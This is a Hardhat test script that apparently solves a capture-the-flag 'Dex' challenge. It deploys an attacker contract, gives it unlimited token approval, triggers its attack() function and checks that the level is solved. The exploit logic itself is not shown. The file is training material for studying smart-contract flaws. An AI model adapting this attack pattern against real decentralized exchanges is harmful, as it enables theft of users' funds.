import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let player: Signer;
let dex: Contract;
let attacker: Contract;

before(async () => {
    accounts = await ethers.getSigners();
    [player] = accounts;

    const dexFactory = await ethers.getContractFactory("Dex");
    const challengeAddress = await createChallenge(
        "0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F"
    );
    dex = dexFactory.attach(challengeAddress);

    const attackerFactory = await ethers.getContractFactory("DexAttacker");
    attacker = await attackerFactory.deploy(dex.target);
    await attacker.waitForDeployment();
    const tx = await dex.approve(attacker.target, ethers.MaxUint256);
    await tx.wait();
});

it("solves the challenge", async function () {
    const token1Addr = await dex.token1();
    const token2Addr = await dex.token2();
    console.log("before:", {
        d1: (await dex.balanceOf(token1Addr, player)).toString(),
        d2: (await dex.balanceOf(token2Addr, player)).toString(),
    });

    const tx = await attacker.attack();
    await tx.wait();

    console.log("after:", {
        d1: (await dex.balanceOf(token1Addr, player)).toString(),
        d2: (await dex.balanceOf(token2Addr, player)).toString(),
    });
});

after(async () => {
    expect(
        await submitLevel(dex.target as string),
        "level not solved"
    ).to.be.true;
});
